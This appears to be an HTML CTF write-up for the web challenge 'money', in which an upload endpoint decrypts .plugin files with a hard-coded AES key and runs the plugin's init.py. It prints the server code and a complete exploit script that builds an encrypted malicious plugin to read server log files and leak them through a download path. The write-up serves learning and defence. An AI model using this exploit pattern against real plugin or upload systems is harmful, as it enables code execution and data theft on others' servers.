@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - Web Challenge: Remote Plugin Execution</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+        .step {
+            margin-bottom: 30px;
+        }
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+        ul {
+            padding-left: 20px;
+        }
+        ul li {
+            margin-bottom: 8px;
+        }
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+        .vulnerability {
+            background-color: #3d1a1a;
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .attack-chain {
+            background-color: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🎯 Challenge: money</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC</div>
+            <div>📢 Category: Web</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 61</div>
+            <div>👤 Author: stancium</div>
+            <div>👤 Solver: ArghgrA/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+    <div class="container">
+        <h2>📝 Challenge Description</h2>
+        <div class="description">
+            <p>This isn't wordpress...</p>
+        </div>
+        <p><strong>📁 Files:</strong> Server.py</p>
+        <p><strong>🌐 Server:</strong> http://ctf.ac.upt.ro:9719</p>
+    </div>
+    <div class="container">
+        <h2>📝 Overview</h2>
+        <div class="description">
+            <p>The service exposes an upload functionality for files with .plugin extension. After upload, the server performs a complex chain of operations that ultimately leads to remote code execution through plugin processing and execution.</p>
+        </div>
+        <div class="attack-chain">
+            <h4>🔗 Attack Chain:</h4>
+            <ol>
+                <li>Saves the uploaded file to a temporary plugin directory</li>
+                <li>Decrypts the file (AES-CBC with hard-coded key) obtaining a ZIP archive</li>
+                <li>Extracts the ZIP to the plugin directory</li>
+                <li>Reads plugin_manifest.json to register the plugin in the registry</li>
+                <li>Executes init.py from the plugin using subprocess.run(["python","init.py"], cwd=plugin_dir, ...)</li>
+            </ol>
+            <p><strong>Result:</strong> Remote code execution vulnerability via plugin upload</p>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🔍 Server Code Analysis</h2>
+        <p>Key vulnerable code sections:</p>
+        <pre><code class="language-python"># Hard-coded AES key
+BASE_DIR = "/opt/app"
+PLUGINS_DIR = os.path.join(BASE_DIR, "plugins")
+REGISTRY_PATH = os.path.join(BASE_DIR, "plugins.json")
+LOG_PATH = os.path.join(BASE_DIR, "app.log")
+STORE_DIR = os.path.join(BASE_DIR, "store")
+
+KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"
+
+# Upload handler (simplified)
+@app.post("/upload")
+def upload():
+    # ...
+    f = request.files["file"]
+    if not f.filename.endswith(".plugin"):
+        return jsonify({"error":".plugin file required"}), 400
+
+    uid = str(uuid.uuid4())
+    plugin_dir = os.path.join(PLUGINS_DIR, uid)
+    os.makedirs(plugin_dir, exist_ok=True)
+    enc_path = os.path.join(plugin_dir, f.filename)
+    f.save(enc_path)
+
+    dec_zip_path = os.path.join(plugin_dir, "plugin.zip")
+    try:
+        decrypt_file(enc_path, dec_zip_path, KEY)
+    except Exception as e:
+        log(f"decrypt_error uid={uid} err={e}")
+        return jsonify({"error":"decryption failed"}), 400
+
+    try:
+        with zipfile.ZipFile(dec_zip_path, "r") as z:
+            z.extractall(plugin_dir)
+    except Exception as e:
+        log(f"extract_error uid={uid} err={e}")
+        return jsonify({"error":"bad zip"}), 400
+
+    # Load manifest and register plugin in registry
+    manifest_path = os.path.join(plugin_dir, "plugin_manifest.json")
+
+    # Execute init.py inside plugin_dir
+    try:
+        r = subprocess.run(["python","init.py"], cwd=plugin_dir, 
+                          capture_output=True, text=True, timeout=30)
+        global FLAG_ID
+        FLAG_ID = uid
+        log(f"plugin_stdout uid={uid} out={r.stdout.strip()}")
+        log(f"plugin_stderr uid={uid} err={r.stderr.strip()}")
+    except Exception as e:
+        log(f"exec_error uid={uid} err={e}")
+    return redirect(url_for("dashboard"))</code></pre>
+        <div class="vulnerability">
+            <h3>🚨 Key Vulnerabilities:</h3>
+            <ul>
+                <li><strong>Hard-coded encryption key:</strong> AES key is visible in source code</li>
+                <li><strong>Unrestricted ZIP extraction:</strong> No sanitization during archive extraction</li>
+                <li><strong>Arbitrary code execution:</strong> init.py runs with server filesystem access</li>
+                <li><strong>File system access:</strong> Can read files like /opt/app/app.log and /opt/app/store/*</li>
+            </ul>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🛠️ Attack Strategy</h2>
+        <div class="step">
+            <h3>💡 Exploitation Plan</h3>
+            <ol>
+                <li>Create a malicious ZIP plugin containing init.py that reads sensitive server files (/opt/app/app.log)</li>
+                <li>Save exfiltrated data to /opt/app/store/flag_leak.txt</li>
+                <li>Encrypt the ZIP using AES-CBC with the hard-coded KEY and random IV</li>
+                <li>Upload the .plugin file via /upload endpoint</li>
+                <li>Download the exfiltrated data via /store/download/flag_leak.txt</li>
+            </ol>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🐍 Exploit Script</h2>
+        <p>Complete exploit script that automates the creation of the encrypted .plugin file:</p>
+        <pre><code class="language-python">import os
+import zipfile
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+# --- Configuration ---
+PLUGIN_NAME = "flag_reader"
+OUTPUT_PLUGIN = f"{PLUGIN_NAME}.plugin"
+KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"  # Must match server key
+
+# Temporary plugin folder
+TMP_DIR = "tmp_plugin"
+os.makedirs(TMP_DIR, exist_ok=True)
+
+# --- 1. Create init.py ---
+init_py = """\
+# init.py
+with open("/opt/app/app.log", "r") as f:
+    data = f.read()
+
+# Save to a file inside the plugin, so you can download it later
+with open("/opt/app/store/flag_leak.txt", "w") as out:
+    out.write(data)
+"""
+with open(os.path.join(TMP_DIR, "init.py"), "w") as f:
+    f.write(init_py)
+
+# --- 2. Create plugin_manifest.json ---
+manifest = """\
+{
+    "name": "Flag Reader",
+    "version": "1.0",
+    "author": "CTF Player",
+    "icon": "icon.png"
+}
+"""
+with open(os.path.join(TMP_DIR, "plugin_manifest.json"), "w") as f:
+    f.write(manifest)
+
+# --- 3. Create minimal index.html ---
+index_html = """\
+<!DOCTYPE html>
+<html>
+<body>ArghgrA</body>
+</html>
+"""
+with open(os.path.join(TMP_DIR, "index.html"), "w") as f:
+    f.write(index_html)
+
+# --- 4. Create dummy icon ---
+with open(os.path.join(TMP_DIR, "icon.png"), "wb") as f:
+    f.write(b"\x89PNG\r\n\x1a\n")  # Minimal PNG header
+
+# --- 5. Create ZIP ---
+zip_path = f"{PLUGIN_NAME}.zip"
+with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
+    for fname in ["init.py", "plugin_manifest.json", "index.html", "icon.png"]:
+        z.write(os.path.join(TMP_DIR, fname), arcname=fname)
+
+# --- 6. Encrypt ZIP with AES-CBC ---
+with open(zip_path, "rb") as f:
+    plaintext = f.read()
+
+iv = os.urandom(16)
+cipher = AES.new(KEY, AES.MODE_CBC, iv)
+ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+
+with open(OUTPUT_PLUGIN, "wb") as f:
+    f.write(iv + ciphertext)
+
+print(f"[+] Encrypted plugin created: {OUTPUT_PLUGIN}")
+print("Upload it to /upload and then download the flag via /store/download/flag_leak.txt")</code></pre>
+        <div class="highlight-section">
+            <p>💡 <strong>Key Technical Details:</strong></p>
+            <ul>
+                <li>The .plugin file contains IV (16 bytes) + ciphertext</li>
+                <li>init.py executes with cwd set to plugin directory but can access absolute paths</li>
+                <li>Server logs stdout/stderr to app.log and sets FLAG_ID to plugin uid</li>
+            </ul>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🎯 Step-by-Step Reproduction</h2>
+        <div class="step">
+            <h3>📋 Execution Steps</h3>
+            <ol>
+                <li><strong>Prepare exploit script:</strong> Save the script above</li>
+                <li><strong>Generate malicious plugin:</strong> Run script to get flag_reader.plugin</li>
+                <li><strong>Upload payload:</strong> Upload flag_reader.plugin via /upload form</li>
+                <li><strong>Wait for execution:</strong> Server decrypts, extracts, and executes init.py</li>
+                <li><strong>Download exfiltrated data:</strong> Access /store/download/flag_leak.txt</li>
+            </ol>
+        </div>
+        <div class="key-point">
+            <p>⚠️ <strong>Note:</strong> The store download is unlocked when there are >2 plugins registered. The server may have automatic uploads that populate the store.</p>
+        </div>
+    </div>
+    <div class="container">
+        <h2>📚 Lessons Learned</h2>
+        <ul>
+            <li>Hard-coded encryption keys provide no real security against determined attackers</li>
+            <li>Unrestricted file upload combined with code execution creates critical vulnerabilities</li>
+            <li>ZIP extraction without path sanitization can lead to directory traversal attacks</li>
+            <li>Executing user-provided code (init.py) without sandboxing enables arbitrary command execution</li>
+            <li>File system access from uploaded plugins allows data exfiltration</li>
+            <li>Proper input validation, sandboxing, and secure key management are essential</li>
+        </ul>
+    </div>
+    <div class="container references">
+        <h2>🔗 References</h2>
+        <ul>
+            <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP: Unrestricted File Upload</a></li>
+        </ul>
+    </div>
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by ArghgrA/CuboConNoveQuadrati | Happy hacking! 🔍</p>
+    </div>
+</body>
+</html>
